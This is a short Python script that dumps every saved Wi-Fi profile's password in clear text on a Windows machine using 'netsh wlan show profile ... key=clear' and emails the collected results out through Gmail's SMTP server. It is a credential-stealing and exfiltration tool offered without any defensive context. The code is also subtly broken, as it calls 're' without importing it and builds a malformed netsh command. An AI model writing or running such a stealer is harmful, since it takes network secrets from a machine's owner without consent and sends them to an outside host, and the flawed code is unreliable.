import subprocess
import smtplib
import os
import optparse
from optparse import OptionParser

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email, email, message)
    server.quit()

def main():
    parser = OptionParser()
    parser.add_option("-m", "--mail", dest="email", help="Your email")
    parser.add_option("-p", "--pass", dest="password", help="Your pass")
    (option, args) = parser.parse_args()
    email = option.email
    password = option.password
    
    command = "netsh wlan show profile"
    networks = subprocess.check_output(command, shell=True)
    net_name = re.findall("(?:Profile\s)(.*)", networks)
    result = ""

    for network_name in net_name:
        command = "netsh wlan show profile" + network_name + " key=clear"
        cur_res=subprocess.check_output(command, shell=True)
        result = result + cur_res
    send_mail(email, password, result)

if __name__=='__main__':
    main()